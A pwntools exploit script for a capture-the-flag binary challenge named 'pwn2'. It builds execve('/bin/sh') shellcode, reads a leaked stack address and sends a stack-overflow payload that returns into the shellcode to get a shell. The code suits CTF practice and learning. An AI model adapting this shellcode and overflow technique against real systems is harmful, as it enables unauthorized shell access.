from pwn import *


binary = "src/pwn2"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break vuln
continue
"""

if args.REMOTE:
    p = remote("pwn2.chal.cyberjousting.com", 1337)
elif args.REMOTE2:
    p = remote("localhost", 40000)
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()


### GEN SHELLCODE ###
shellcode = asm(
"""
xor   rsi, rsi	                # clear rsi
xor   rdx, rdx                  # clear rdx
push  rsi	                    # push null on the stack
mov   rdi, 0x68732f6e69622f     # /bin/sh in reverse order
push  rdi
push  rsp
pop   rdi                       # stack pointer to /bin/sh
mov   rax, 59                   # sys_execve
syscall
""")
print(f"shellcode = {shellcode}")
print(f"len(shellcode) = {len(shellcode)}")


### LEAK ###
leak = int(p.recvline().strip().decode(),16)
print(f"leak = {hex(leak)}")


### EXPLOIT ###
payload = flat(
    shellcode,
    b'A' * (0x48 - len(shellcode)),
    p64(leak)
)
p.sendline(payload)
p.interactive()